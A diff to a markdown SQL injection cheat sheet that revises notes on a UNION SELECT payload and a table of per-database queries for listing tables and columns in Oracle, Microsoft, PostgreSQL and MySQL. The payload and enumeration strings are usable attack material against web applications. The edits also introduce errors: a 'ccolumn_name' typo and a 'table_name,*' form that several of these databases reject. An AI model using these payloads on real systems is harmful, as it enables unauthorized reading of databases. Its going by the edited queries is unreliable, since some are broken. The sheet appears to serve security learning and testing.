@@ -17,7 +17,7 @@ PostgreSQL 12.15 (Ubuntu 12.15-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compile
 ```
 #
 
-***IF WE RUN*** the following command you will see that you won't get any result or you may be blocked:
+***IF WE RUN*** the following command **without using the correct columns** you will see that you won't get any result or you may be blocked:
 ```sql
 ' UNION SELECT version()--
 ```
@@ -85,12 +85,15 @@ Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 1439
 ## Database contents
 *You can list the tables that exist in the database, and the columns that those tables contain.*
 
+## `*`
+> This Defines that you might have to add more columns in the code in order for code to work
+
 | Type | String |
 | --- | --- |
-| Oracle   | `SELECT * FROM all_tables` <br> `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
-| Microsoft |  `SELECT * FROM information_schema.tables` <br> `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
-| PostgreSQL |  `SELECT * FROM information_schema.tables` <br> `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
-| MySQL |  `SELECT * FROM information_schema.tables` <br> `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| Oracle   | `SELECT table_name,* FROM all_tables` <br> `SELECT column_name,* FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| Microsoft |  `SELECT table_name,* FROM information_schema.tables` <br> `SELECT column_name,* FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| PostgreSQL |  `SELECT table_name,* FROM information_schema.tables` <br> `SELECT ccolumn_name,* FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| MySQL |  `SELECT table_name,* FROM information_schema.tables` <br> `SELECT column_name,* FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
 
  With `.tables` it returns output like the following: 
  ```sql
